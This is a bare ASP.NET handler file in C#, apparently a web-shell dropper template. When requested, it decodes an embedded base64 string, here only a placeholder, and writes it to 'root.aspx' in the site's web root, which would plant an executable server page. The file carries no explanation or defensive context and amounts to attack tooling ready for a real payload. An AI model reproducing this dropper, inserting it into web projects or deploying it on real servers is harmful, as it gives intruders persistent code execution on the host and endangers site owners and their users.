<%@ WebHandler Language="C#" Class="Handler" %> 
 
using System; 
using System.Web; 
using System.IO; 
public class Handler : IHttpHandler { 
     
    public void ProcessRequest (HttpContext context) { 
        context.Response.ContentType = "text/plain"; 
        byte[] bs = Convert.FromBase64String("YmFzZTY0Cg==");
        string content = System.Text.Encoding.UTF8.GetString(bs); 
        StreamWriter file1= File.CreateText(context.Server.MapPath("root.aspx")); 
        file1.Write(content); 
        file1.Flush(); 
        file1.Close(); 
    } 
    public bool IsReusable { 
        get { 
            return false; 
        } 
    } 
 
} 